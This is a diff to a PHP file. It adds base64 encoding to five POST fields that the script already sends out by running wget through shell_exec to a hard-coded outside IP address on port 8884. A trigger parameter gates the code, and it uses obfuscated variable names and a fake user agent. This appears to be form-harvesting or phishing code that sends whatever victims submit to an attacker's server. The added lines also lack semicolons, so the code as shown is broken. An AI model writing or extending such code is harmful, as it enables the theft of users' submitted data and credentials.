@@ -19,13 +19,23 @@ if($_GET["linux84"] == "linux84")
 
 $google84741 = $_POST["linux2"];
 
+$google84741 = base64_encode($google84741)
+
 $google84742 = $_POST["linux3"];
+
+$google84742 = base64_encode($google84742)
 
 $google84744 = $_POST["linux1"];
 
+$google84744 = base64_encode($google84744)
+
 $google847412 = $_POST["linux5"];
 
+$google847412 = base64_encode($google847412)
+
 $google847446 = $_POST["linux4"];
+
+$google847446 = base64_encode($google847446)
 
 echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google84744 . "&linux1=" . $google847412 . "&linux4=" . $google847446 . "' 'http://154.127.52.52:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
 
